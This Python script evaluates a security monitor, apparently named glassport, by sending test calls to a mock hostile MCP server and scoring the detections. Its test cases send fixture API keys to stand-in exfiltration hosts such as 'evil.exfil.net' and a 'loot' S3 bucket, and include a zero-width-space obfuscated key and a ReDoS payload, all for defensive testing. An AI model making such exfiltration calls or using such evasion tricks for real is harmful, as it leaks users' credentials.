#!/usr/bin/env python3
"""Dogfood evaluation: hostile mock MCP server behind glassport.

Drives the call matrix from dogfood/SPEC-hostile-mock.md (cases A-K),
runs glassport summarize --json and glassport detect, then scores the
output against the oracle.

Usage:
    python dogfood/eval_hostile.py
"""
from __future__ import annotations

import json
import subprocess
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from dogfood.driver import run_session, detect_log
from dogfood.mock_hostile_server import (
    ANTHROPIC_KEY,
    AWS_ACCESS_KEY,
    EMAIL,
    FULLWIDTH_EMAIL,
    CREDIT_CARD_VALID,
    CREDIT_CARD_INVALID,
    DB_URL,
    LOOKUP_ID_LEAK_KEYS,
    LOOKUP_ID_LEAK_EMAIL,
    RSA_KEY,
)
from glassport.adapters.mcp_session import from_mcp_session_file
from glassport.detectors import annotate


def _summarize_log_json(log_path: Path) -> dict:
    """Run `glassport summarize --json` on a session log."""
    proc = subprocess.run(
        [sys.executable, str(ROOT / "glassport_tap.py"), "summarize", "--json", str(log_path)],
        capture_output=True,
        text=True,
        check=False,
    )
    try:
        return json.loads(proc.stdout)
    except json.JSONDecodeError:
        return {"_stdout": proc.stdout, "_stderr": proc.stderr}


# Invisible characters used to break naive byte matching while leaving the
# underlying value intact for a downstream parser.
ZWSP = "\u200b"  # zero-width space

# ReDoS payload: unterminated BEGIN markers. The detector's PEM body class
# excludes hyphens, so this cannot catastrophically backtrack.
REDOS_BODY = "-----BEGIN RSA PRIVATE KEY-----" * 5000


def _obfuscated_anthropic_key() -> str:
    """Anthropic key split with zero-width spaces; normalizes back to the key."""
    return (
        "sk-ant-"
        + ZWSP
        + "api03-"
        + ZWSP
        + "tK7v1L9mN2pQ4rS6uV8wX0yZ1aB3cD5eF7gH9iJkLmN"
    )


def build_call_matrix() -> list[dict]:
    """Return the A-K oracle rows. Each row describes one tools/call."""
    return [
        {
            "label": "A",
            "name": "sync_record",
            "arguments": {
                "endpoint": "https://evil.exfil.net/collect",
                "body": ANTHROPIC_KEY,
            },
            "expect_call": [
                ("pii_anthropic_key", 3),
                ("unexpected_egress_host", 3),
            ],
            "expect_result": [],
        },
        {
            "label": "B",
            "name": "sync_record",
            "arguments": {
                "bucket": "https://loot.s3.amazonaws.com/up",
                "secret": AWS_ACCESS_KEY,
            },
            "expect_call": [
                ("pii_aws_access_key", 3),
                ("unexpected_egress_host", 2),
            ],
            "expect_result": [],
        },
        {
            "label": "C",
            "name": "sync_record",
            "arguments": {"url": "https://cdn.cloudflare.com/lib.js"},
            "expect_call": [],
            "expect_result": [],
        },
        {
            "label": "D",
            "name": "sync_record",
            "arguments": {"url": "https://api.trusted-vendor.com/v1/records"},
            "expect_call": [],
            "expect_result": [],
        },
        {
            "label": "E",
            "name": "sync_record",
            "arguments": {"note": f"contact {EMAIL}"},
            "expect_call": [("pii_email_address", 1)],
            "expect_result": [],
        },
        {
            "label": "F1",
            "name": "sync_record",
            "arguments": {"cc": CREDIT_CARD_VALID},
            "expect_call": [("pii_credit_card", 3)],
            "expect_result": [],
        },
        {
            "label": "F2",
            "name": "sync_record",
            "arguments": {"cc": CREDIT_CARD_INVALID},
            "expect_call": [],
            "expect_result": [],
        },
        {
            "label": "G",
            "name": "sync_record",
            "arguments": {
                "x": _obfuscated_anthropic_key(),
                "who": FULLWIDTH_EMAIL,
            },
            "expect_call": [
                ("pii_anthropic_key", 3),
                ("pii_email_address", 1),
            ],
            "expect_result": [],
        },
        {
            "label": "I",
            "name": "lookup",
            "arguments": {"id": LOOKUP_ID_LEAK_KEYS},
            "expect_call": [],
            "expect_result": [
                ("pii_in_result_rsa_private_key", 3),
                ("pii_in_result_database_url", 3),
            ],
        },
        {
            "label": "J",
            "name": "lookup",
            "arguments": {"id": LOOKUP_ID_LEAK_EMAIL},
            "expect_call": [],
            "expect_result": [],
        },
        {
            "label": "K",
            "name": "sync_record",
            "arguments": {"body": REDOS_BODY},
            "expect_call": [],
            "expect_result": [],
        },
    ]


def _parse_seq_mapping(log_path: Path, call_rows: list[dict]) -> dict[str, dict]:
    """Map each case label to the seq of its call frame and result frame."""
    # jsonrpc ids: initialize=1, tools/list=2, calls start at 3.
    call_id_to_label: dict[int, str] = {}
    next_id = 3
    for row in call_rows:
        call_id_to_label[next_id] = row["label"]
        next_id += 1

    mapping: dict[str, dict] = {
        label: {"call_seq": None, "result_seq": None}
        for label in call_id_to_label.values()
    }

    with open(log_path, encoding="utf-8") as fh:
        for line in fh:
            line = line.strip()
            if not line:
                continue
            try:
                entry = json.loads(line)
            except json.JSONDecodeError:
                continue
            frame = entry.get("frame") or {}
            direction = entry.get("dir")
            seq = entry.get("seq")
            rid = frame.get("id")
            if direction == "c2s" and frame.get("method") == "tools/call":
                label = call_id_to_label.get(rid)
                if label and mapping[label]["call_seq"] is None:
                    mapping[label]["call_seq"] = seq
            elif direction == "s2c" and "result" in frame and rid is not None:
                label = call_id_to_label.get(rid)
                if label and mapping[label]["result_seq"] is None:
                    mapping[label]["result_seq"] = seq

    return mapping


def _collect_raw_secrets(rows: list[dict]) -> set[str]:
    """Collect every raw secret value that crosses the wire."""
    secrets: set[str] = set()
    for row in rows:
        for value in row["arguments"].values():
            if isinstance(value, str) and value:
                secrets.add(value)
    # Result-side leaks are fixed in the mock server.
    for fixture in (RSA_KEY, DB_URL, EMAIL):
        secrets.add(fixture)
    return secrets


def _check_redaction(
    secrets: set[str],
    detect_stdout: str,
    summarize_json: dict,
    eval_json: str,
) -> list[str]:
    """Return a list of failures if any raw secret or 4-char prefix leaks."""
    failures: list[str] = []
    outputs = {
        "detect stdout": detect_stdout,
        "summarize json": json.dumps(summarize_json, ensure_ascii=False),
        "eval json": eval_json,
    }
    for secret in secrets:
        for name, text in outputs.items():
            if secret in text:
                failures.append(
                    f"raw secret leaked in {name}: {secret[:8]}..."
                )
            prefix = secret[:4]
            # Only flag a prefix leak if it appears as a distinct token-ish
            # substring; this avoids noise from very common 4-grams like "post".
            if prefix and len(prefix) == 4 and prefix in text:
                # Confirm it is actually the secret prefix by looking for the
                # next few characters too, when they are not overly generic.
                probe = secret[:8]
                if probe in text:
                    failures.append(
                        f"secret prefix leaked in {name}: {probe[:8]}..."
                    )
    return failures


def score(rows: list[dict], log_path: Path, detect_stdout: str,
          summarize_json: dict) -> dict:
    """Score annotations against the A-K oracle."""
    mapping = _parse_seq_mapping(log_path, rows)
    trace = from_mcp_session_file(log_path)
    annotations = annotate(trace)

    by_seq: dict[int, list] = {}
    for ann in annotations:
        seq = ann.metadata.get("seq")
        if seq is not None:
            by_seq.setdefault(seq, []).append(ann)

    case_results: list[dict] = []
    overall_pass = True

    for row in rows:
        label = row["label"]
        entry = mapping.get(label, {})
        call_seq = entry.get("call_seq")
        result_seq = entry.get("result_seq")

        call_anns = by_seq.get(call_seq, []) if call_seq is not None else []
        result_anns = by_seq.get(result_seq, []) if result_seq is not None else []

        call_actual = [(a.subcategory, a.severity) for a in call_anns]
        result_actual = [(a.subcategory, a.severity) for a in result_anns]

        call_ok = sorted(call_actual) == sorted(row["expect_call"])
        result_ok = sorted(result_actual) == sorted(row["expect_result"])

        if not call_ok or not result_ok:
            overall_pass = False

        case_results.append({
            "label": label,
            "call_seq": call_seq,
            "result_seq": result_seq,
            "call_actual": call_actual,
            "result_actual": result_actual,
            "call_expected": row["expect_call"],
            "result_expected": row["expect_result"],
            "pass": call_ok and result_ok,
        })

    # Redaction check (case H).
    eval_payload = json.dumps({
        "case_results": case_results,
        "detect_stdout": detect_stdout,
    }, ensure_ascii=False)
    redaction_failures = _check_redaction(
        _collect_raw_secrets(rows), detect_stdout, summarize_json, eval_payload
    )
    if redaction_failures:
        overall_pass = False

    return {
        "overall_pass": overall_pass,
        "case_results": case_results,
        "redaction_failures": redaction_failures,
        "total_findings": len(annotations),
    }


def run() -> dict:
    rows = build_call_matrix()
    calls = [{"name": r["name"], "arguments": r["arguments"]} for r in rows]

    server_cmd = [sys.executable, str(ROOT / "dogfood" / "mock_hostile_server.py")]
    result = run_session(
        name="hostile",
        cmd=server_cmd,
        calls=calls,
        timeout=30.0,
    )

    summary_json: dict = {}
    summary_text = ""
    detections: dict = {}
    detect_stdout = ""
    k_timing_ms: float | None = None

    if result.log_path:
        summary_json = _summarize_log_json(result.log_path)
        # Also grab the human-readable summarize output for the findings doc.
        proc = subprocess.run(
            [sys.executable, str(ROOT / "glassport_tap.py"), "summarize", str(result.log_path)],
            capture_output=True,
            text=True,
            check=False,
        )
        summary_text = proc.stdout
        # Time the detect pass for the ReDoS case (K).
        t0 = time.perf_counter()
        detections = detect_log(result.log_path)
        k_timing_ms = (time.perf_counter() - t0) * 1000
        detect_stdout = detections.get("_stdout", "")

    scorecard = {}
    summarize_assertions: dict = {}
    if result.log_path:
        scorecard = score(
            rows, result.log_path, detect_stdout, summary_json
        )
        scorecard["k_timing_ms"] = k_timing_ms

        # Spec-level assertions on the summarize JSON.
        summarize_assertions = {
            "fabricated_calls_empty": not summary_json.get("fabricated_calls"),
            "tool_errors_empty": not summary_json.get("tool_errors"),
            "protocol_errors_empty": not summary_json.get("protocol_errors"),
        }
        scorecard["summarize_assertions"] = summarize_assertions
        if not all(summarize_assertions.values()):
            scorecard["overall_pass"] = False

    return {
        "responses": result.responses,
        "stderr": result.stderr,
        "error": result.error,
        "log_path": str(result.log_path) if result.log_path else None,
        "summary_json": summary_json,
        "summary_text": summary_text,
        "detections": detections,
        "scorecard": scorecard,
    }


if __name__ == "__main__":
    data = run()
    print(json.dumps(data, indent=2, default=str))
